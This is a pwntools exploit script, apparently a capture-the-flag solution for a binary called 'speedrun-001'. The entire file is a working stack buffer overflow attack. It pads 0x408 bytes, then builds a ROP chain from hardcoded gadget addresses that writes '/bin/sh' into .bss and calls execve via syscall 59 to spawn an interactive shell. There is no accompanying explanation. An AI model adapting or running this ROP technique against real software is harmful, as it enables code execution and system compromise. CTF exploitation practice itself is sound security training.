from pwn import *

binary = context.binary = ELF("./speedrun-001")

rdi_gadget = 0x400686
rsi_gadget = 0x4101f3
rdx_gadget = 0x4498b5
rax_gadget = 0x415664
syscall_gadget = 0x4a906b
mov_gadget = 0x435603     # mov qword ptr [rdi], rdx ; ret

bss_addr = 0x6bb2f0

if args.GDB:
    p = gdb.debug(binary.path, gdbscript='b *0x400b8b')
else:
    p = process(binary.path)

payload =  b""
payload += b"A" * 0x408
payload += p64(rdi_gadget)
payload += p64(bss_addr)
payload += p64(rdx_gadget)
payload += b"/bin/sh\x00"
payload += p64(mov_gadget)
payload += p64(rsi_gadget)
payload += p64(0)
payload += p64(rdx_gadget)
payload += p64(0)
payload += p64(rax_gadget)
payload += p64(59)
payload += p64(syscall_gadget)

with open("payload", "wb") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()